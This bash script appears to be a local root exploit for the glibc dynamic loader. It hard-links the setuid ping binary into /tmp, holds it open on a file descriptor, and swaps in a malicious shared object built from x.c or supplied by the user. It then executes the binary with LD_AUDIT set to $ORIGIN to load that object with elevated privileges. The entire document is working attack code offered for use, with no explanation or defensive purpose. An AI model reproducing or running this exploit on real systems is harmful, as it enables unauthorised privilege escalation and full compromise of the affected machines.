#!/bin/bash
mkdir /tmp/ln
ln /bin/ping /tmp/ln/target
if [ ! -f /tmp/ln/target ];then 
echo "Not vulnerable."
exit
fi
exec 3< /tmp/ln/target
rm -rf /tmp/ln/
if [ ! -f /usr/bin/gcc ];then
printf "Your version is - x86 - x64: "
read VERS
mv $VERS /tmp/ln
chmod +x /tmp/ln
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
else
gcc -w -fPIC -shared -o /tmp/ln x.c
echo "In or out...."
LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
fi
